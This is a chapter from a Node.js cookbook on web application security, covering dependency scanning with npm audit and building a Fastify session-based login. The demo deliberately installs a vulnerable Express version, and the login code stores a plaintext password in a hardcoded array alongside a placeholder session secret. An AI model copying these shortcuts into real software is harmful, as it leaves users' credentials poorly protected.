<html><head></head><body>
  <div><h1 class="chapter-number" id="_idParaDest-267">
    <a id="_idTextAnchor274">
    </a>
    
     9
    
   </h1>
   <h1 id="_idParaDest-268">
    <a id="_idTextAnchor275">
    </a>
    
     Dealing with Security
    
   </h1>
   <p>
    
     Throughout this book, we’ve learned how we can use Node.js to build applications.
    
    
     As with all software, you must take certain precautions to ensure the application you’re building
    
    
     
      is secure.
     
    
   </p>
   <p>
    
     First, you should ensure that you’ve adopted any Node.js releases that contain security fixes.
    
    
     For this reason, where possible, you should aim to be on the latest release of a given Node.js
    
    
     
      release line.
     
    
   </p>
   <p>
    
     This chapter will cover some of the key aspects of Node.js web application security.
    
    
     The later recipes demonstrate some of the common attacks on web applications, including
    
    <strong class="bold">
     
      cross-site scripting
     
    </strong>
    
     (
    
    <strong class="bold">
     
      XSS
     
    </strong>
    
     ) and
    
    <strong class="bold">
     
      cross-site request forgery
     
    </strong>
    
     (
    
    <strong class="bold">
     
      CSRF
     
    </strong>
    
     ) attacks.
    
    
     They will showcase
    
    <a id="_idIndexMarker674">
    </a>
    
     how to
    
    <a id="_idIndexMarker675">
    </a>
    
     prevent and mitigate the risk of some of
    
    
     
      these attacks.
     
    
   </p>
   <p>
    
     This chapter will cover the
    
    
     
      following recipes:
     
    
   </p>
   <ul>
    <li>
     
      Detecting
     
     
      
       dependency vulnerabilities
      
     
    </li>
    <li>
     
      Authentication
     
     
      
       with Fastify
      
     
    </li>
    <li>
     
      Hardening headers
     
     
      
       with Helmet
      
     
    </li>
    <li>
     
      Anticipating
     
     
      
       malicious input
      
     
    </li>
    <li>
     
      Preventing
     
     
      
       JSON pollution
      
     
    </li>
    <li>
     
      Guarding
     
     
      
       against XSS
      
     
    </li>
    <li>
     
      
       Preventing CSRF
      
     
    </li>
   </ul>
   <h1 id="_idParaDest-269">
    <a id="_idTextAnchor276">
    </a>
    
     Technical requirements
    
   </h1>
   <p>
    
     You should have Node.js installed, preferably the latest version of Node.js 22, and access to an editor and browser of
    
    
     
      your choice.
     
    
   </p>
   <p>
    
     Throughout the recipes, we’ll be installing modules from the
    
    <strong class="source-inline">
     
      npm
     
    </strong>
    
     registry – therefore, an internet connection will
    
    
     
      be required.
     
    
   </p>
   <p>
    
     The code for the recipes in this chapter is available in this book’s GitHub repository at
    
    <a href="https://github.com/PacktPublishing/Node.js-Cookbook-Fifth-Edition">
     
      https://github.com/PacktPublishing/Node.js-Cookbook-Fifth-Edition
     
    </a>
    
     , in the
    
    
     <em class="italic">
      
       Chapter
      
     </em>
    
    
     <em class="italic">
      
       09
      
     </em>
    
    
     
      directory.
     
    
   </p>
   <h1 id="_idParaDest-270">
    <a id="_idTextAnchor277">
    </a>
    
     Detecting dependency vulnerabilities
    
   </h1>
   <p>
    
     Throughout this book, we’ve
    
    <a id="_idIndexMarker676">
    </a>
    
     leveraged modules from the
    
    <strong class="source-inline">
     
      npm
     
    </strong>
    
     registry to form a foundation for the applications we build.
    
    
     We’ve learned how the vast module ecosystem enables us to focus on application logic and not have to reinvent common technical
    
    
     
      solutions repeatedly.
     
    
   </p>
   <p>
    
     This ecosystem is key to Node.js’s success.
    
    
     However, it does lead to large, nested dependency trees within our applications.
    
    
     Not only must we be concerned with the security of the application code that we write ourselves, but we must also consider the security of the code included in the modules in our dependency tree.
    
    
     Even the most mature and popular modules and frameworks may contain
    
    
     
      security vulnerabilities.
     
    
   </p>
   <p>
    
     In this recipe, we’ll demonstrate how to detect vulnerabilities in a project’s
    
    
     
      dependency tree.
     
    
   </p>
   <h2 id="_idParaDest-271">
    <a id="_idTextAnchor278">
    </a>
    
     Getting ready
    
   </h2>
   <p>
    
     For this recipe, we’ll create a directory named
    
    <strong class="source-inline">
     
      audit-deps
     
    </strong>
    
     where we can install some
    
    
     
      Node.js modules:
     
    
   </p>
   <pre class="console">
$ mkdir audit-deps
$ cd audit-deps
$ npm init --yes</pre>
   <p>
    
     We don’t need to add any further code as we’ll be focusing on learning how to audit the dependencies using
    
    
     
      the terminal.
     
    
   </p>
   <h2 id="_idParaDest-272">
    <a id="_idTextAnchor279">
    </a>
    
     How to do it…
    
   </h2>
   <p>
    
     In this recipe, we’ll install some modules from the
    
    <strong class="source-inline">
     
      npm
     
    </strong>
    
     registry and scan them
    
    
     
      for vulnerabilities:
     
    
   </p>
   <ol>
    <li>
     
      First, let’s install an old version of the
     
     <strong class="source-inline">
      
       express
      
     </strong>
     
      module.
     
     
      We’ve intentionally chosen an old version with known vulnerabilities to demonstrate how to audit our dependencies.
     
     
      This version of Express.js is not recommended for use in
     
     
      
       production applications:
      
     
     <pre class="source-code">
<strong class="bold">$ npm install express@4.16.0</strong>
<strong class="bold">added 8 packages, removed 3 packages, changed 14 packages, and audited 52 packages in 674ms</strong>
<strong class="bold">3 high severity vulnerabilities</strong>
<strong class="bold">To address all issues, run:</strong>
<strong class="bold">  npm audit fix</strong>
<strong class="bold">Run `npm audit` for details.</strong></pre>
     <p class="list-inset">
      
       Observe that
      
      <a id="_idIndexMarker677">
      </a>
      
       the
      
      <strong class="source-inline">
       
        npm
       
      </strong>
      
       output detects eight known vulnerabilities in this version
      
      
       
        of Express.js.
       
      
     </p>
    </li>
    <li>
     
      As the output suggests, run the
     
     <strong class="source-inline">
      
       $ npm audit
      
     </strong>
     
      command for
     
     
      
       more details:
      
     
     <pre class="source-code">
<strong class="bold">$ npm audit</strong></pre>
    </li>
    <li>
     
      Observe the output of the
     
     <strong class="source-inline">
      
       $ npm audit
      
     </strong>
     
      command, as shown in the following screenshot.
     
     
      The output lists the individual vulnerabilities, along with
     
     
      
       further information:
      
     
    </li>
   </ol>
   <div><div><img alt="Figure 9.1 – npm audit output for express@4.16.0" src="img/B19212_09_01.jpg"/>
     
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    
     Figure 9.1 – npm audit output for express@4.16.0
    
   </p>
   <ol>
    <li value="4">
     
      We can follow the
     
     <a id="_idIndexMarker678">
     </a>
     
      GitHub links specified in the console output to navigate to the advisory for the particular vulnerability.
     
     
      This will open a web page detailing an overview of the vulnerability and
     
     
      
       remediation actions:
      
     
    </li>
   </ol>
   <div><div><img alt="Figure 9.2 – Example npm vulnerability advisory" src="img/B19212_09_02.jpg"/>
     
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    
     Figure 9.2 – Example npm vulnerability advisory
    
   </p>
   <ol>
    <li value="5">
     
      We can try to
     
     <a id="_idIndexMarker679">
     </a>
     
      automatically fix the vulnerabilities by using the
     
     <strong class="source-inline">
      
       $ npm audit fix
      
     </strong>
     
      command.
     
     
      This will attempt to update any dependencies to
     
     
      
       fixed versions:
      
     
     <pre class="source-code">
<strong class="bold">$ npm audit fix</strong>
<strong class="bold">npm WARN audit-deps@1.0.0 No description</strong>
<strong class="bold">npm WARN audit-deps@1.0.0 No repository field.</strong>
<strong class="bold">+ express@4.17.1</strong>
<strong class="bold">added 8 packages from 10 contributors, removed 4 packages and updated 17 packages in 1.574s</strong>
<strong class="bold">fixed 9 of 9 vulnerabilities in 46 scanned packages</strong></pre>
    </li>
    <li>
     
      Now, when we rerun the
     
     <strong class="source-inline">
      
       $ npm audit
      
     </strong>
     
      command, we’ll get the following output, indicating that there are no longer any known vulnerabilities being detected in our module
     
     
      
       dependency tree:
      
     
     <pre class="source-code">
<strong class="bold">$ npm audit</strong>
<strong class="bold">found 0 vulnerabilities</strong></pre>
    </li>
   </ol>
   <p>
    
     With that, we’ve learned how to use
    
    <strong class="source-inline">
     
      $ npm audit
     
    </strong>
    
     to scan for vulnerabilities in
    
    
     
      our dependencies.
     
    
   </p>
   <h2 id="_idParaDest-273">
    <a id="_idTextAnchor280">
    </a>
    
     How it works…
    
   </h2>
   <p>
    
     The
    
    <strong class="source-inline">
     
      $ npm audit
     
    </strong>
    
     command has been available since
    
    <strong class="source-inline">
     
      npm
     
    </strong>
    
     version 6.
    
    
     The command submits a report of the dependencies in our application and compares it with a database of known vulnerabilities.
    
    
     The
    
    <strong class="source-inline">
     
      $ npm audit
     
    </strong>
    
     command will audit direct, development, bundled, and optional dependencies.
    
    
     However, it does not audit peer dependencies.
    
    
     The command requires both a
    
    <strong class="source-inline">
     
      package.json
     
    </strong>
    
     file and a
    
    <strong class="source-inline">
     
      package-lock.json
     
    </strong>
    
     file to be present; otherwise, it will fail.
    
    
     The audit automatically runs when a package is installed with the
    
    <strong class="source-inline">
     
      $ npm
     
    </strong>
    
     <strong class="source-inline">
      
       install
      
     </strong>
    
    
     
      command.
     
    
   </p>
   <p>
    
     Many organizations
    
    <a id="_idIndexMarker680">
    </a>
    
     consider
    
    <strong class="source-inline">
     
      $ npm audit
     
    </strong>
    
     to be a precautionary measure to protect their applications against known security vulnerabilities.
    
    
     For this reason, it is common to add the
    
    <strong class="source-inline">
     
      $ npm audit
     
    </strong>
    
     command to
    
    <a id="_idIndexMarker681">
    </a>
    
     your
    
    <strong class="bold">
     
      continuous integration
     
    </strong>
    
     (
    
    <strong class="bold">
     
      CI
     
    </strong>
    
     ) testing.
    
    
     The
    
    <strong class="source-inline">
     
      $ npm audit
     
    </strong>
    
     command reports an error code of
    
    <strong class="source-inline">
     
      1
     
    </strong>
    
     when a vulnerability is found; this error code can be leveraged to indicate a
    
    
     
      failed test.
     
    
   </p>
   <p>
    
     In this recipe, we used the
    
    <strong class="source-inline">
     
      $ npm audit fix
     
    </strong>
    
     command to automatically update our dependencies to fixed versions.
    
    
     This command will only upgrade dependencies to later minor or
    
    
     
      patch versions.
     
    
   </p>
   <p>
    
     Should a vulnerability only be fixed in a new major version,
    
    <strong class="source-inline">
     
      npm
     
    </strong>
    
     will output a warning indicating the fix is available via
    
    <strong class="source-inline">
     
      npm audit fix --force
     
    </strong>
    
     , as shown in the
    
    
     
      following screenshot:
     
    
   </p>
   <div><div><img alt="Figure 9.3 – npm audit output showing breaking change resolution" src="img/B19212_09_03.jpg"/>
     
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    
     Figure 9.3 – npm audit output showing breaking change resolution
    
   </p>
   <p>
    
     Fixes that require updates to a new major release will not be automatically fixed by the
    
    <strong class="source-inline">
     
      $ npm audit fix
     
    </strong>
    
     command as you may need to update your application code to accommodate the breaking change in the dependency.
    
    
     It is possible to override this behavior and force
    
    <strong class="source-inline">
     
      npm
     
    </strong>
    
     to update all dependencies, even if they include breaking changes, using the
    
    <strong class="source-inline">
     
      $ npm audit fix --force
     
    </strong>
    
     command.
    
    
     However, in the case of a breaking change, it would be prudent to review the individual module vulnerabilities and manually update the modules one at
    
    
     
      a time.
     
    
   </p>
   <p>
    
     In some cases, a patched
    
    <a id="_idIndexMarker682">
    </a>
    
     version of a dependency may not be available.
    
    
     In this case,
    
    <strong class="source-inline">
     
      npm
     
    </strong>
    
     will inform you that a manual review is required.
    
    
     During this manual review, it’s worthwhile trying to determine whether your application is susceptible to the vulnerability.
    
    
     Some vulnerabilities will only apply to the use of certain APIs, so if you’re not using those APIs in your application, you may be able to discount the specific vulnerability.
    
    
     If the vulnerability applies to your application and there’s no patched version of the dependency available, you should consider patching it within your application’s
    
    <strong class="source-inline">
     
      node_modules
     
    </strong>
    
     , if possible.
    
    
     A common approach to achieve this is
    
    <a id="_idIndexMarker683">
    </a>
    
     using the
    
    <strong class="source-inline">
     
      patch-package
     
    </strong>
    
     (
    
    <a href="https://www.npmjs.com/package/patch-package">
     
      https://www.npmjs.com/package/patch-package
     
    </a>
    
     ) module
    
    
     
      from
     
    
    
     <strong class="source-inline">
      
       npm
      
     </strong>
    
    
     
      .
     
    
   </p>
   <p class="callout-heading">
    
     Important note
    
   </p>
   <p class="callout">
    
     In general, it’s worthwhile keeping your application’s dependencies as up-to-date as possible to ensure you have the latest available bugs and security fixes.
    
    
     Tools such as
    
    <strong class="bold">
     
      Dependabot
     
    </strong>
    
     (
    
    <a href="https://dependabot.com/">
     
      https://dependabot.com/
     
    </a>
    
     ) can help keep your dependencies up to date by
    
    <a id="_idIndexMarker684">
    </a>
    
     automating updates
    
    
     
      on GitHub.
     
    
   </p>
   <p>
    
     Note that
    
    <strong class="source-inline">
     
      npm audit
     
    </strong>
    
     works by comparing your dependency tree against a database of known vulnerabilities.
    
    
     Having
    
    <strong class="source-inline">
     
      npm audit
     
    </strong>
    
     return no known vulnerabilities doesn’t mean your dependencies aren’t vulnerable – there could, and likely are, unreported or unknown vulnerabilities in your tree.
    
    
     There are also commercial services that provide module dependency vulnerability auditing services.
    
    
     Some of these, such as
    
    <strong class="bold">
     
      Snyk
     
    </strong>
    
     (
    
    <a href="https://snyk.io/">
     
      https://snyk.io/
     
    </a>
    
     ), maintain
    
    <a id="_idIndexMarker685">
    </a>
    
     their own weakness and vulnerability databases, which may contain a different set of known issues to audit your
    
    
     
      dependencies against.
     
    
   </p>
   <p>
    
     There are additional options
    
    <a id="_idIndexMarker686">
    </a>
    
     available when using
    
    <strong class="source-inline">
     
      npm audit
     
    </strong>
    
     so that you can tailor it to
    
    
     
      your needs:
     
    
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      
       --audit-level &lt;level&gt;
      
     </strong>
     
      : Allows you to specify the minimum vulnerability level that
     
     <strong class="source-inline">
      
       npm audit
      
     </strong>
     
      should report on.
     
     
      The levels include
     
     <strong class="source-inline">
      
       info
      
     </strong>
     
      ,
     
     <strong class="source-inline">
      
       low
      
     </strong>
     
      ,
     
     <strong class="source-inline">
      
       moderate
      
     </strong>
     
      ,
     
     <strong class="source-inline">
      
       high
      
     </strong>
     
      ,
     
     
      
       and
      
     
     
      <strong class="source-inline">
       
        critical
       
      </strong>
     
     
      
       .
      
     
    </li>
    <li>
     <strong class="source-inline">
      
       --dry-run
      
     </strong>
     
      : Simulates the action of fixing vulnerabilities without applying
     
     
      
       any changes.
      
     
    </li>
    <li>
     <strong class="source-inline">
      
       --force
      
     </strong>
     
      : Forces vulnerable dependencies to be updated, bypassing certain checks such as peer dependency compatibility.
     
     
      This option should be used with caution as it can lead to dependency conflicts or introduce breaking changes within
     
     
      
       your project.
      
     
    </li>
    <li>
     <strong class="source-inline">
      
       --json
      
     </strong>
     
      : Outputs the audit results in
     
     
      
       JSON format.
      
     
    </li>
    <li>
     <strong class="source-inline">
      
       --package-lock-only
      
     </strong>
     
      : Restricts the audit to project dependencies defined in the
     
     <strong class="source-inline">
      
       package-lock.json
      
     </strong>
     
      or
     
     <strong class="source-inline">
      
       npm-shrinkwrap.json
      
     </strong>
     
      files, without requiring an
     
     
      
       actual install.
      
     
    </li>
    <li>
     <strong class="source-inline">
      
       --no-package-lock
      
     </strong>
     
      : Ignores the project’s
     
     <strong class="source-inline">
      
       package-lock.json
      
     </strong>
     
      or
     
     <strong class="source-inline">
      
       npm-shrinkwrap.json
      
     </strong>
     
      files during the audit.
     
     
      This can be useful when you want to audit the state of the
     
     
      <strong class="source-inline">
       
        node_modules
       
      </strong>
     
     
      
       directory.
      
     
    </li>
    <li>
     <strong class="source-inline">
      
       --omit
      
     </strong>
     
      and
     
     <strong class="source-inline">
      
       --include
      
     </strong>
     
      : Allow you to configure which types of dependencies (development, optional, or peer dependencies) to exclude or include in the audit
     
     
      
       process, respectively.
      
     
    </li>
   </ul>
   <h2 id="_idParaDest-274">
    <a id="_idTextAnchor281">
    </a>
    
     There’s more...
    
   </h2>
   <p>
    
     In addition to using
    
    <strong class="source-inline">
     
      npm audit
     
    </strong>
    
     , you can leverage GitHub’s Dependabot to enhance your project’s security and keep your dependencies up to date.
    
    
     Dependabot automates the process of checking for vulnerabilities and creating pull requests to update your dependencies.
    
    
     It continuously monitors your project’s dependencies and alerts you if it detects any vulnerabilities.
    
    
     Dependabot can automatically open pull requests to update outdated dependencies to their
    
    
     
      latest versions.
     
    
   </p>
   <p>
    
     By integrating Dependabot with your GitHub repository, you can ensure that your project stays current with the latest security patches and updates, reducing the risk of potential
    
    <a id="_idIndexMarker687">
    </a>
    
     vulnerabilities.
    
    
     Please refer to
    
    <a href="https://docs.github.com/en/code-security/dependabot">
     
      https://docs.github.com/en/code-security/dependabot
     
    </a>
    
     for GitHub guidelines on enabling and
    
    
     
      using Dependabot.
     
    
   </p>
   <h2 id="_idParaDest-275">
    <a id="_idTextAnchor282">
    </a>
    
     See also
    
   </h2>
   <ul>
    <li>
     
      The
     
     <strong class="source-inline">
      
       npm
      
     </strong>
     
      documentation
     
     <a id="_idIndexMarker688">
     </a>
     
      for
     
     <strong class="source-inline">
      
       npm
      
     </strong>
     
      <strong class="source-inline">
       
        audit
       
      </strong>
     
     
      
       :
      
     
     <a href="https://docs.npmjs.com/auditing-package-dependencies-for-security-vulnerabilities">
      
       
        https://docs.npmjs.com/auditing-package-dependencies-for-security-vulnerabilities
       
      
     </a>
    </li>
    <li>
     
      The
     
     <em class="italic">
      
       Consuming Node.js modules
      
     </em>
     
      recipe in
     
     <a href="B19212_05.xhtml#_idTextAnchor139">
      
       <em class="italic">
        
         Chapter 5
        
       </em>
      
     </a>
    </li>
   </ul>
   <h1 id="_idParaDest-276">
    <a id="_idTextAnchor283">
    </a>
    
     Authentication with Fastify
    
   </h1>
   <p>
    
     Many web
    
    <a id="_idIndexMarker689">
    </a>
    
     applications require a login system.
    
    
     Often, users of a website have different privileges, and to determine which resources they can access, they must first be identified
    
    
     
      through authentication.
     
    
   </p>
   <p>
    
     This is typically achieved by setting up a session, which is a temporary information exchange between a user and a device.
    
    
     Sessions enable the server to store user-specific information, which can be used to manage access and maintain the user’s state across
    
    
     
      multiple requests.
     
    
   </p>
   <p>
    
     In this recipe, we’ll implement an authentication layer for a Fastify server.
    
    
     Please refer to
    
    <a href="B19212_06.xhtml#_idTextAnchor178">
     
      <em class="italic">
       
        Chapter 6
       
      </em>
     
    </a>
    
     for more information
    
    
     
      on Fastify.
     
    
   </p>
   <h2 id="_idParaDest-277">
    <a id="_idTextAnchor284">
    </a>
    
     Getting ready
    
   </h2>
   <p>
    
     Let’s start by creating a
    
    
     
      Fastify server:
     
    
   </p>
   <ol>
    <li>
     
      Create a project directory named
     
     <strong class="source-inline">
      
       fastify-auth
      
     </strong>
     
      to work in and initialize the project with
     
     <strong class="source-inline">
      
       npm
      
     </strong>
     
      .
     
     
      We’ll also create some files and subdirectories that we’ll use later in
     
     
      
       this recipe:
      
     
     <pre class="source-code">
<strong class="bold">$ mkdir fastify-auth</strong>
<strong class="bold">$ cd fastify-auth</strong>
<strong class="bold">$ npm init --yes</strong>
<strong class="bold">$ mkdir routes views</strong>
<strong class="bold">$ touch server.js routes/index.js views/index.ejs</strong></pre>
    </li>
    <li>
     
      We’ll also need to install
     
     
      
       several modules:
      
     
     <pre class="source-code">
<strong class="bold">$ npm install fastify @fastify/view @fastify/formbody ejs</strong></pre>
    </li>
    <li>
     
      Add the following
     
     <a id="_idIndexMarker690">
     </a>
     
      code to the
     
     <strong class="source-inline">
      
       server.js
      
     </strong>
     
      file.
     
     
      This will configure an initial Fastify server that
     
     
      
       we’ll extend:
      
     
     <pre class="source-code">
const fastify = require('fastify')({ logger: true });
const path = require('path');
const view = require('@fastify/view');
const fastifyFormbody = require('@fastify/formbody');
const indexRoutes = require('./routes/index');
fastify.register(fastifyFormbody);
fastify.register(view, {
  engine: {
    ejs: require('ejs')
  },
  root: path.join(__dirname, 'views')
});
fastify.register(indexRoutes);
const start = async () =&gt; {
  try {
    await fastify.listen({ port: 3000 });
    fastify.log.info(`Server listening on
      ${fastify.server.address().port}`);
  } catch (err) {
    fastify.log.error(err);
    process.exit(1);
  }
};
start();</pre>
    </li>
    <li>
     
      Add the
     
     <a id="_idIndexMarker691">
     </a>
     
      following to
     
     <strong class="source-inline">
      
       routes/index.js
      
     </strong>
     
      to create a base router that will handle an HTTP
     
     <strong class="source-inline">
      
       GET
      
     </strong>
     
      request
     
     
      
       on
      
     
     
      <strong class="source-inline">
       
        /
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
async function routes(fastify, options) {
    fastify.get('/', async (request, reply) =&gt; {
      return reply.view('index.ejs');
    });
  }
module.exports = routes;</pre>
    </li>
    <li>
     
      Add the following to
     
     <strong class="source-inline">
      
       views/index.ejs
      
     </strong>
     
      to create an
     
     <strong class="bold">
      
       Embedded JavaScript
      
     </strong>
     
      (
     
     <strong class="bold">
      
       EJS
      
     </strong>
     
      ) template.
     
     
      For
     
     <a id="_idIndexMarker692">
     </a>
     
      now, this will just be a simple welcome
     
     
      
       page template:
      
     
     <pre class="source-code">
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;Authentication with Fastify&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;h1&gt;Authentication with Fastify&lt;/h1&gt;
        &lt;% if (typeof user !== 'undefined' &amp;&amp; user) {
          %&gt;
        &lt;p&gt;Hello &lt;%= user.username %&gt;!&lt;/p&gt;
        &lt;p&gt;&lt;a href="/auth/logout"&gt;Logout&lt;/a&gt;&lt;/p&gt;
        &lt;% } else { %&gt;
        &lt;p&gt;&lt;a href="/auth/login"&gt;Login&lt;/a&gt;&lt;/p&gt;
        &lt;% } %&gt;
    &lt;/body&gt;
&lt;/html&gt;</pre>
    </li>
    <li>
     
      Start the server
     
     <a id="_idIndexMarker693">
     </a>
     
      with the following command and navigate to
     
     <strong class="source-inline">
      
       http://localhost:3000
      
     </strong>
     
      in
     
     
      
       your browser:
      
     
     <pre class="source-code">
<strong class="bold">$ node server.js</strong></pre>
    </li>
   </ol>
   <p>
    
     You should expect to see a web page titled
    
    <strong class="bold">
     
      Authenticating with Fastify
     
    </strong>
    
     .
    
    
     Stop the server using
    
    <em class="italic">
     
      Ctrl
     
    </em>
    
     +
    
    
     <em class="italic">
      
       C
      
     </em>
    
    
     
      .
     
    
   </p>
   <p>
    
     Now that we have a simple Fastify server, we can start implementing the
    
    
     
      authentication layer.
     
    
   </p>
   <h2 id="_idParaDest-278">
    <a id="_idTextAnchor285">
    </a>
    
     How to do it…
    
   </h2>
   <p>
    
     In this recipe, we’ll add a login system to our Fastify server using the
    
    <strong class="source-inline">
     
      @fastify/cookie
     
    </strong>
    
     and
    
    <strong class="source-inline">
     
      @
     
    </strong>
    
     <strong class="source-inline">
      
       fastify/session
      
     </strong>
    
    
     
      modules:
     
    
   </p>
   <ol>
    <li>
     
      Start by installing
     
     
      
       the modules:
      
     
     <pre class="source-code">
<strong class="bold">$ npm install @fastify/cookie @fastify/session</strong></pre>
    </li>
    <li>
     
      We’ll create a separate router to handle authentication, as well as an EJS template that will contain our HTML login form.
     
     
      Let’s create those
     
     
      
       files now:
      
     
     <pre class="source-code">
<strong class="bold">$ touch routes/auth.js views/login.ejs</strong></pre>
    </li>
    <li>
     
      Now, let’s create our HTML login form using an EJS template.
     
     
      The HTML form will have two fields:
     
     <strong class="source-inline">
      
       username
      
     </strong>
     
      and
     
     <strong class="source-inline">
      
       password
      
     </strong>
     
      .
     
     
      This template will expect to be passed a value
     
     <a id="_idIndexMarker694">
     </a>
     
      named
     
     <strong class="source-inline">
      
       fail
      
     </strong>
     
      .
     
     
      When the fail value is
     
     <strong class="source-inline">
      
       true
      
     </strong>
     
      , the
     
     <strong class="source-inline">
      
       Login Failed.
      
     </strong>
     
      message will be rendered.
     
     
      Add the following code
     
     
      
       to
      
     
     
      <strong class="source-inline">
       
        views/login.ejs
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;Authentication with Fastify - Login&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;h1&gt;Authentication with Fastify - Login&lt;/h1&gt;
    &lt;% if (fail) { %&gt;
    &lt;h2&gt;Login Failed.&lt;/h2&gt;
    &lt;% } %&gt;
    &lt;form method="post" action="login"&gt;
      Username: &lt;input type="text" name="username" /&gt;
      Password: &lt;input type="password" name="password"
        /&gt;
      &lt;input type="submit" value="Login" /&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;</pre>
    </li>
    <li>
     
      Now, we need to build our authentication router.
     
     
      We’ll do this in the
     
     <strong class="source-inline">
      
       routes/auth.js
      
     </strong>
     
      file.
     
     
      The authentication router will contain route handlers for the
     
     <strong class="source-inline">
      
       /login
      
     </strong>
     
      and
     
     <strong class="source-inline">
      
       /logout
      
     </strong>
     
      endpoints.
     
     
      The
     
     <strong class="source-inline">
      
       /login
      
     </strong>
     
      endpoint will require both an HTTP
     
     <strong class="source-inline">
      
       GET
      
     </strong>
     
      and an HTTP
     
     <strong class="source-inline">
      
       POST
      
     </strong>
     
      handler.
     
     
      The HTTP
     
     <strong class="source-inline">
      
       POST
      
     </strong>
     
      handler for the
     
     <strong class="source-inline">
      
       /login
      
     </strong>
     
      endpoint will receive and parse the form data (username and password) to validate the user credentials.
     
     
      Add the following to
     
     <strong class="source-inline">
      
       routes/auth.js
      
     </strong>
     
      to
     
     <a id="_idIndexMarker695">
     </a>
     
      create the
     
     
      
       authentication router:
      
     
     <pre class="source-code">
const users = [{ username: 'beth', password:
  'badpassword' }];
async function routes (fastify, options) {
  fastify.get('/login', async (request, reply) =&gt; {
    return reply.view('login.ejs', { fail: false });
  });
  fastify.post('/login', async (request, reply) =&gt; {
    const { username, password } = request.body;
    const user = users.find((u) =&gt; u.username ===
      username);
    if (user &amp;&amp; password === user.password) {
      request.session.user = { username: user.username };
      await request.session.save();
      return reply.view('index.ejs', { user:
        request.session.user });
    } else { return reply.view('login.ejs', { fail:
      true }); }
  });
  fastify.get('/logout', async (request, reply) =&gt; {
    request.session.destroy((err) =&gt; {
      if (err) { return reply.send(err); }
      else { return reply.redirect('/'); }
    });
  });
}
module.exports = routes;</pre>
    </li>
    <li>
     
      Next, we need to
     
     <a id="_idIndexMarker696">
     </a>
     
      update our
     
     <strong class="source-inline">
      
       routes/index.js
      
     </strong>
     
      file so that we can pass the user data from the session to the
     
     
      
       EJS template:
      
     
     <pre class="source-code">
async function routes (fastify, options) {
  fastify.get('/', async (request, reply) =&gt; {
<strong class="bold">    const user = request.session.user;</strong>
    return reply.view('index.ejs'<strong class="bold">, { user: user }</strong>);
  });
}
module.exports = routes;</pre>
    </li>
    <li>
     
      Now, add the imports for
     
     <strong class="source-inline">
      
       @fastify/cookie
      
     </strong>
     
      and
     
     <strong class="source-inline">
      
       @fastify/session
      
     </strong>
     
      alongside the other imports in the
     
     
      <strong class="source-inline">
       
        server.js
       
      </strong>
     
     
      
       file:
      
     
     <pre class="source-code">
...
const view = require('@fastify/view');
const fastifyFormbody = require('@fastify/formbody');
<strong class="bold">const fastifyCookie = require('@fastify/cookie');</strong>
<strong class="bold">const fastifySession = require('@fastify/session');</strong>
...</pre>
    </li>
    <li>
     
      Import
     
     <a id="_idIndexMarker697">
     </a>
     
      the
     
     
      <strong class="source-inline">
       
        auth
       
      </strong>
     
     
      
       router:
      
     
     <pre class="source-code">
const indexRoutes = require('./routes/index');
<strong class="bold">const authRoutes = require('./routes/auth');</strong>
...</pre>
    </li>
    <li>
     
      Register the plugins with the
     
     
      
       following configuration:
      
     
     <pre class="source-code">
fastify.register(fastifyCookie);
fastify.register(fastifySession, {
  secret: 'a secret with minimum length of 32
    characters',
  cookie: {
    httpOnly: true
  },
  saveUninitialized: false,
  resave: false
});</pre>
    </li>
    <li>
     
      
       Register
      
     
     
      <strong class="source-inline">
       
        authRoutes
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
fastify.register(indexRoutes);
<strong class="bold">fastify.register(authRoutes, { prefix: '/auth' });</strong></pre>
    </li>
    <li>
     
      Start the server with the
     
     
      
       following command:
      
     
     <pre class="source-code">
<strong class="bold">$ node server.js</strong></pre>
    </li>
    <li>
     
      Navigate to
     
     <strong class="source-inline">
      
       http://localhost:3000
      
     </strong>
     
      in your browser.
     
     
      Expect to see the following
     
     
      
       web page:
      
     
    </li>
   </ol>
   <div><div><img alt="Figure 9.4 – Web page depicting “Authentication with Fastify”" src="img/B19212_09_04.jpg"/>
     
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    
     Figure 9.4 – Web page depicting “Authentication with Fastify”
    
   </p>
   <ol>
    <li value="12">
     
      Click
     
     <strong class="bold">
      
       Login
      
     </strong>
     
      ; you’ll
     
     <a id="_idIndexMarker698">
     </a>
     
      be directed to the HTML login form.
     
     
      Supply a random username and password and click
     
     <strong class="bold">
      
       Login
      
     </strong>
     
      .
     
     
      Since this doesn’t match our hardcoded values, we expect to see the
     
     <strong class="bold">
      
       Login
      
     </strong>
     
      <strong class="bold">
       
        Failed.
       
      </strong>
     
     
      
       message.
      
     
    </li>
    <li>
     
      Let’s try the hardcoded values.
     
     
      Supply a username of
     
     <strong class="source-inline">
      
       beth
      
     </strong>
     
      and a password of
     
     <strong class="source-inline">
      
       badpassword
      
     </strong>
     
      and click
     
     <strong class="bold">
      
       Login
      
     </strong>
     
      .
     
     
      The login process should be successful.
     
     
      You will redirect back to the
     
     <strong class="source-inline">
      
       /
      
     </strong>
     
      endpoint, where there will be a
     
     <strong class="bold">
      
       Hello
      
     </strong>
     
      <strong class="bold">
       
        beth!
       
      </strong>
     
     
      
       message.
      
     
    </li>
    <li>
     
      Finally, let’s try and log out.
     
     
      Click the
     
     <strong class="bold">
      
       Logout
      
     </strong>
     
      link.
     
     
      This should redirect you back to the same endpoint, but the
     
     <strong class="bold">
      
       Hello beth!
      
     </strong>
     
      message will be removed as the session
     
     
      
       has ended.
      
     
    </li>
   </ol>
   <p>
    
     This recipe introduced the
    
    <strong class="source-inline">
     
      @fastify/cookie
     
    </strong>
    
     and
    
    <strong class="source-inline">
     
      @fastify/session
     
    </strong>
    
     modules and how we can use them to build a simple login functionality.
    
    
     Now, let’s see how it
    
    
     
      all works.
     
    
   </p>
